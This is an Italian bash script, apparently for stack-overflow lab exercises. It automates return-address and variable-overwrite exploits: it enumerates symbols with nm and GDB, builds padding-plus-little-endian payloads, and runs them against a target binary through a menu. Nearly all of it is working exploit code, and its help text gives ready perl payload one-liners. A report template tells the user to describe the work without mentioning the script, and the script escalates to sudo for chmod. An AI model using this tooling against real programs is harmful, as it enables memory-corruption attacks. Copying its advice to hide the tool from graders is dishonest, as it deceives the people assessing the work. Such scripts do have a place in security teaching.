#!/bin/bash
#
# func_or_var.sh - Exploit "padding + 4 byte Little-Endian" con enumerazione
#                  interattiva dei bersagli.
#
# Idea: l'esercizio di default e' SECRET FUNCTION, quindi lo script ENUMERA le
# funzioni del binario (nome + indirizzo risolto A RUNTIME, cosi' vale anche per
# i binari PIE) e te le propone in un menu. Scegli una funzione -> costruisce il
# payload [ 'A' x OFFSET + indirizzo in Little-Endian ], lo esegue e ti mostra
# l'output; poi torni al menu per provarne un'altra (ciclo).
#
# Se "nessuna di queste" funziona, passi -- per TUA scelta, non per una diagnosi
# automatica -- alla modalita' VARIABILE (write var): lo script ti RICHIEDE
# l'offset (la cella bersaglio e' il puntatore/variabile, in genere a una
# distanza diversa dal return address) ed enumera i dati del binario. In piu',
# in entrambe le modalita', c'e' sempre l'inserimento MANUALE di un indirizzo/
# valore, che copre i casi non enumerabili (binario stripped, simbolo assente,
# valore richiesto da un 'if').
#
# NB: lo script non decide mai se l'esercizio e' func o var -- quello lo scegli
# tu. "Nessuna funzione ha funzionato" non dimostra che sia var: poteva essere
# offset sbagliato, un null byte nell'indirizzo, o la flag stampata ma non
# riconosciuta (sei tu a leggere l'output, non lo script).

# ----------------------------- Help ----------------------------------------
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
cat << 'EOF'
NAME
    func_or_var.sh - Payload "padding + 4 byte LE" con enumerazione interattiva

SYNOPSIS
    ./func_or_var.sh [-s] ./nome_binario <OFFSET>
    ./func_or_var.sh OPTION

DESCRIPTION
    Costruisce ed esegue il payload   [ 'A' x OFFSET ] + [ 4 byte Little-Endian ].
    Parte in modalita' FUNZIONE: enumera le funzioni definite nel binario e ne
    risolve l'indirizzo a runtime (break su main + run, cosi' i binari PIE sono
    gia' rilocati). Scegli dal menu la funzione da usare come indirizzo di
    ritorno; dopo il test torni al menu. Con "nessuna di queste" passi alla
    modalita' VARIABILE, che richiede un nuovo OFFSET ed enumera i dati. In
    entrambe le modalita' resta disponibile l'inserimento manuale (hex).

    I 4 byte vengono invertiti in Little-Endian dallo script. OFFSET e' la
    distanza (in byte) prima della cella da sovrascrivere: l'offset dell'EIP per
    secret function, la distanza del puntatore/variabile per write var. Lo trovi
    con offset_finder.sh o a mano con le "BBBB" in GDB.

    Se il binario esiste ma non ha il permesso di esecuzione, lo script glielo
    assegna da solo (chmod +x, con fallback a sudo solo se serve).

OPTIONS
    -s, --stdin
        Inietta via Standard Input invece che come argomento. Mantiene aperto
        lo stream con 'cat' per interagire con una shell eventualmente aperta.
        Indispensabile anche quando l'indirizzo/valore contiene un byte 0x00
        (via argomento la shell lo troncherebbe).

    -h, --help
        Mostra questa guida.

NOTA
    - Passa il binario come ./nome (con lo slash).
    - L'enumerazione usa 'nm' per i nomi e GDB per risolvere gli indirizzi a
      runtime. Se il binario e' stripped (nessun simbolo), usa l'inserimento
      manuale o passa a variabile.

REPORT (da inserire a mano, SENZA citare lo script)
    1. Padding: "Ho inserito OFFSET byte di riempimento ('A') per raggiungere
       esattamente la cella da sovrascrivere (indirizzo di ritorno / variabile /
       puntatore) senza alterare prima lo stato dello stack."
    2. Individuazione del bersaglio:
       - secret function: "Con 'info functions' in GDB ho individuato la funzione
         non richiamata dal flusso principale e il suo indirizzo."
       - write var: "Con 'info variables' ho individuato l'indirizzo del dato
         segreto (es. la private key) da far stampare."
    3. Little-Endian: "Ho scritto il valore/indirizzo bersaglio invertendo
       l'ordine dei byte (es. 0x080484b4 -> \xb4\x84\x04\x08), come richiede x86."
    4. Esecuzione:
       Argomento: ./bin $(perl -e 'print "A"xOFFSET . "\xb4\x84\x04\x08"')
       STDIN:     (perl -e 'print "A"xOFFSET . "\xb4\x84\x04\x08"'; cat) | ./bin
       (se l'indirizzo contiene 0x00: perl -e 'exec "./bin", "A"xOFFSET . "..."')
    5. Mitigazione: "La vulnerabilita' nasce da una copia senza controllo di
       lunghezza (strcpy/gets) in un buffer fisso. Si corregge con funzioni a
       limite esplicito (strncpy/snprintf/fgets), validando l'input, e
       riabilitando stack canary, NX e ASLR."
EOF
exit 0
fi

# --------------------------- Parsing argomenti -----------------------------
USE_STDIN=false
if [ "$1" == "-s" ] || [ "$1" == "--stdin" ]; then
	USE_STDIN=true
	shift
fi

if [ "$#" -ne 2 ]; then
	echo "Uso: $0 [-s] ./nome_binario <OFFSET>"
	echo "Usa '$0 --help' per il manuale e i comandi per il report."
	exit 1
fi

BINARY="$1"
OFFSET="$2"

if [[ "$BINARY" != /* && "$BINARY" != ./* ]]; then
	echo "[!] Attenzione: '$BINARY' e' senza './'. Consigliato: ./$BINARY"
fi

# --------------------------- Validazioni -----------------------------------
# Verifica che il binario esista e sia eseguibile; se non lo e', lo rende tale.
if [ ! -e "$BINARY" ]; then
	echo "[-] '$BINARY' non esiste."; exit 1
fi
if [ ! -f "$BINARY" ]; then
	echo "[-] '$BINARY' non e' un file regolare."; exit 1
fi
if [ ! -x "$BINARY" ]; then
	echo "[*] '$BINARY' non ha il permesso di esecuzione: lo imposto con 'chmod +x'..."
	if chmod +x "$BINARY" 2>/dev/null; then
		echo "[+] Permesso di esecuzione impostato su '$BINARY'."
	else
		echo "[!] chmod senza privilegi fallito: riprovo con sudo..."
		if sudo chmod +x "$BINARY"; then
			echo "[+] Permesso di esecuzione impostato (via sudo) su '$BINARY'."
		else
			echo "[-] 'chmod +x' su '$BINARY' fallito anche con sudo."; exit 1
		fi
	fi
fi
if ! [[ "$OFFSET" =~ ^[0-9]+$ ]]; then
	echo "[-] OFFSET deve essere un numero intero."; exit 1
fi
if ! command -v gdb >/dev/null 2>&1; then
	echo "[-] gdb non trovato nel PATH (serve per risolvere gli indirizzi)."; exit 1
fi
if ! command -v nm >/dev/null 2>&1; then
	echo "[!] 'nm' non trovato: l'enumerazione non sara' disponibile, resta il manuale."
fi

# --------------------------- Funzioni di supporto --------------------------

# Elenca i NOMI dei simboli di testo (funzioni) definiti, togliendo il rumore
# del runtime C / compilatore. (Gli indirizzi li risolviamo dopo, a runtime.)
list_func_names() {
	nm --defined-only "$BINARY" 2>/dev/null \
		| awk '$2 ~ /^[tTwW]$/ { print $3 }' \
		| grep -vE '^(_init|_fini|_start|__libc_csu_init|__libc_csu_fini|__do_global_dtors_aux|frame_dummy|register_tm_clones|deregister_tm_clones|__libc_start_main|_dl_relocate_static_pie|data_start|__data_start|_IO_stdin_used|__gmon_start__)$' \
		| grep -vE '^(__x86\.get_pc_thunk|__stack_chk)' \
		| sort -u
}

# Elenca i NOMI dei simboli di dato (variabili globali/statiche) definiti.
list_var_names() {
	nm --defined-only "$BINARY" 2>/dev/null \
		| awk '$2 ~ /^[dDbBrR]$/ { print $3 }' \
		| grep -vE '^(__data_start|data_start|__bss_start|_edata|_end|__dso_handle|__TMC_END__|_DYNAMIC|_GLOBAL_OFFSET_TABLE_|_IO_stdin_used|__FRAME_END__|__GNU_EH_FRAME_HDR|__abi_tag|__gmon_start__|stdin|stdout|stderr)$' \
		| grep -vE '^(completed\.|__do_global|__init_array|__frame|__libc|__start_|__stop_)' \
		| sort -u
}

# Risolve a runtime gli indirizzi dei simboli passati come argomenti.
# Stampa righe "NOME 0xINDIRIZZO". Si ferma su main (break+run) cosi' i binari
# PIE sono gia' rilocati; stdin da /dev/null per non bloccarsi su eventuali read.
resolve_addrs() {
	[ "$#" -eq 0 ] && return 0
	local name gdbargs=()
	for name in "$@"; do
		gdbargs+=( -ex "printf \"%s %p\\n\", \"$name\", &$name" )
	done
	gdb -q -batch \
		-ex "set pagination off" \
		-ex "break main" \
		-ex "run" \
		"${gdbargs[@]}" \
		"$BINARY" < /dev/null 2>/dev/null \
		| grep -E '^[A-Za-z_][A-Za-z0-9_]* 0x[0-9a-fA-F]+'
}

# Popola gli array globali NAMES[] e ADDRS[] per la modalita' richiesta (func|var).
NAMES=(); ADDRS=()
enumerate() {
	local kind="$1" names=() n a
	NAMES=(); ADDRS=()
	if [ "$kind" = func ]; then
		echo "[*] Enumero le funzioni del binario (risoluzione indirizzi a runtime)..."
		mapfile -t names < <(list_func_names)
	else
		echo "[*] Enumero le variabili/dati del binario (risoluzione a runtime)..."
		mapfile -t names < <(list_var_names)
	fi
	[ "${#names[@]}" -eq 0 ] && return 0
	while read -r n a; do
		[ -z "$n" ] && continue
		NAMES+=("$n"); ADDRS+=("$a")
	done < <(resolve_addrs "${names[@]}")
}

# Vero (0) se l'hex (coppie di byte) contiene almeno un byte 00.
has_null_byte() {
	perl -e 'my @b=unpack("(A2)*",$ARGV[0]); exit( (grep {$_ eq "00"} @b) ? 0 : 1 )' "$1"
}

# Anteprima del contenuto a un indirizzo (per trovare la key nei dati).
preview_addr() {
	local a="$1"
	echo "[*] Anteprima contenuto a $a:"
	gdb -q -batch -ex "set pagination off" -ex "break main" -ex "run" \
		-ex "x/s $a" -ex "x/4xw $a" "$BINARY" < /dev/null 2>/dev/null \
		| grep -E '^0x' | sed 's/^/    /'
}

# Costruisce ed esegue il payload: 'A' x CUR_OFFSET + hex invertito (Little-Endian).
# Usa CUR_OFFSET (globale, diverso tra modalita' func e var).
inject_hex() {
	local INPUT="$1" CLEAN_HEX HEX_PADDED PERL_CMD LE_SHOW PAYLOAD
	CLEAN_HEX=${INPUT#0x}; CLEAN_HEX=${CLEAN_HEX#0X}
	if ! [[ "$CLEAN_HEX" =~ ^[0-9a-fA-F]+$ ]]; then
		echo "[-] Non e' esadecimale valido. Esempio: 0x565561b9 oppure 42434445"
		return 1
	fi
	# pad a 8 (32 bit) o 16 (64 bit) cifre, a sinistra con zeri, per il LE corretto
	if [ ${#CLEAN_HEX} -le 8 ]; then
		HEX_PADDED=$(printf "%08s" "$CLEAN_HEX" | tr ' ' '0')
	else
		HEX_PADDED=$(printf "%016s" "$CLEAN_HEX" | tr ' ' '0')
	fi
	PERL_CMD="print 'A'x$CUR_OFFSET; print map { chr(hex(\$_)) } reverse unpack('(A2)*', '$HEX_PADDED')"
	LE_SHOW=$(perl -e "print join('', map { sprintf('\\\\x%s',\$_) } reverse unpack('(A2)*', '$HEX_PADDED'))")

	echo "[*] Offset: $CUR_OFFSET  |  bersaglio: 0x$HEX_PADDED  |  Little-Endian: $LE_SHOW"
	if [ "$USE_STDIN" != true ] && has_null_byte "$HEX_PADDED"; then
		echo "[!] Il bersaglio contiene un byte 0x00: via ARGOMENTO la shell tronca il payload."
		echo "    Rilancia con -s (STDIN) oppure a mano:"
		echo "    perl -e 'exec \"$BINARY\", \"A\"x$CUR_OFFSET . \"$LE_SHOW\"'"
	fi
	echo "[+] Esecuzione..."
	echo "--------------------------------------------------"
	if [ "$USE_STDIN" = true ]; then
		(perl -e "$PERL_CMD"; cat) | "$BINARY"
	else
		PAYLOAD=$(perl -e "$PERL_CMD")
		"$BINARY" "$PAYLOAD"
	fi
	echo ""
	echo "--------------------------------------------------"
}

# --------------------------- Stato iniziale --------------------------------
echo "[*] Target: $BINARY"
if [ "$USE_STDIN" = true ]; then
	echo "[*] Iniezione: STDIN (pipe interattiva con 'cat')"
else
	echo "[*] Iniezione: Argomento da riga di comando"
fi

CUR_OFFSET="$OFFSET"
MODE="func"
FUNC_DONE=0; VAR_DONE=0
FUNC_NAMES=(); FUNC_ADDRS=()
VAR_NAMES=(); VAR_ADDRS=()

# --------------------------- Ciclo interattivo -----------------------------
while true; do

	# ============================ MODALITA' FUNZIONE ====================
	if [ "$MODE" = "func" ]; then
		CUR_OFFSET="$OFFSET"
		if [ "$FUNC_DONE" -eq 0 ]; then
			enumerate func
			FUNC_NAMES=("${NAMES[@]}"); FUNC_ADDRS=("${ADDRS[@]}"); FUNC_DONE=1
		fi

		echo ""
		echo "====== MODALITA' FUNZIONE (secret function) ======"
		echo "Offset (padding 'A'): $CUR_OFFSET byte"
		echo "Funzioni trovate nel binario:"
		if [ "${#FUNC_NAMES[@]}" -eq 0 ]; then
			echo "   (nessuna funzione enumerabile - binario stripped? usa 'm' o 'v')"
		else
			for i in "${!FUNC_NAMES[@]}"; do
				printf "  %2d) %-24s %s\n" "$((i+1))" "${FUNC_NAMES[$i]}" "${FUNC_ADDRS[$i]}"
			done
		fi
		echo "--------------------------------------------------"
		echo " [numero]  prova quella funzione come indirizzo di ritorno"
		echo " m         inserisci un indirizzo a mano (hex)"
		echo " v         nessuna di queste -> passa alla modalita' VARIABILE"
		echo " q         esci"
		read -r -p "> " CH

		case "$CH" in
			q|Q) echo "[*] Uscita."; exit 0 ;;
			m|M)
				read -r -p "Indirizzo della funzione (hex) > " HX
				[ -n "$HX" ] && inject_hex "$HX"
				;;
			v|V)
				echo "[*] Nessuna funzione selezionata: passo alla modalita' VARIABILE."
				echo "    (scelta manuale: 'nessuna ha funzionato' non dimostra che sia var -"
				echo "     poteva essere offset errato, un null byte, o la flag non riconosciuta.)"
				read -r -p "Offset fino al puntatore/variabile [default $OFFSET] > " NEWOFF
				NEWOFF=${NEWOFF:-$OFFSET}
				if ! [[ "$NEWOFF" =~ ^[0-9]+$ ]]; then
					echo "[-] Offset non valido: mantengo $OFFSET."; NEWOFF=$OFFSET
				fi
				CUR_OFFSET="$NEWOFF"
				MODE="var"
				;;
			"") : ;;
			*)
				if [[ "$CH" =~ ^[0-9]+$ ]] && [ "$CH" -ge 1 ] && [ "$CH" -le "${#FUNC_NAMES[@]}" ]; then
					idx=$((CH-1))
					echo "[*] Provo la funzione '${FUNC_NAMES[$idx]}' (${FUNC_ADDRS[$idx]})."
					inject_hex "${FUNC_ADDRS[$idx]}"
				else
					echo "[-] Scelta non valida."
				fi
				;;
		esac

	# ============================ MODALITA' VARIABILE ===================
	else
		if [ "$VAR_DONE" -eq 0 ]; then
			enumerate var
			VAR_NAMES=("${NAMES[@]}"); VAR_ADDRS=("${ADDRS[@]}"); VAR_DONE=1
		fi

		echo ""
		echo "====== MODALITA' VARIABILE (write var) ======"
		echo "Offset (padding 'A'): $CUR_OFFSET byte"
		echo "Variabili/dati trovati nel binario:"
		if [ "${#VAR_NAMES[@]}" -eq 0 ]; then
			echo "   (nessun dato enumerabile - binario stripped? usa 'm')"
		else
			for i in "${!VAR_NAMES[@]}"; do
				printf "  %2d) %-24s %s\n" "$((i+1))" "${VAR_NAMES[$i]}" "${VAR_ADDRS[$i]}"
			done
		fi
		echo "--------------------------------------------------"
		echo " [numero]  inietta l'INDIRIZZO di quel dato (caso leak: lo fa stampare)"
		echo " p         anteprima del contenuto di un dato (x/s)"
		echo " m         inserisci a mano: indirizzo (leak) o VALORE (per un 'if')  (hex)"
		echo " f         torna alle funzioni"
		echo " q         esci"
		read -r -p "> " CH

		case "$CH" in
			q|Q) echo "[*] Uscita."; exit 0 ;;
			f|F) MODE="func" ;;
			m|M)
				read -r -p "Indirizzo/valore (hex) > " HX
				[ -n "$HX" ] && inject_hex "$HX"
				;;
			p|P)
				read -r -p "Numero del dato da ispezionare > " PN
				if [[ "$PN" =~ ^[0-9]+$ ]] && [ "$PN" -ge 1 ] && [ "$PN" -le "${#VAR_NAMES[@]}" ]; then
					preview_addr "${VAR_ADDRS[$((PN-1))]}"
				else
					echo "[-] Numero non valido."
				fi
				;;
			"") : ;;
			*)
				if [[ "$CH" =~ ^[0-9]+$ ]] && [ "$CH" -ge 1 ] && [ "$CH" -le "${#VAR_NAMES[@]}" ]; then
					idx=$((CH-1))
					echo "[*] Inietto l'indirizzo di '${VAR_NAMES[$idx]}' (${VAR_ADDRS[$idx]})."
					inject_hex "${VAR_ADDRS[$idx]}"
				else
					echo "[-] Scelta non valida."
				fi
				;;
		esac
	fi
done
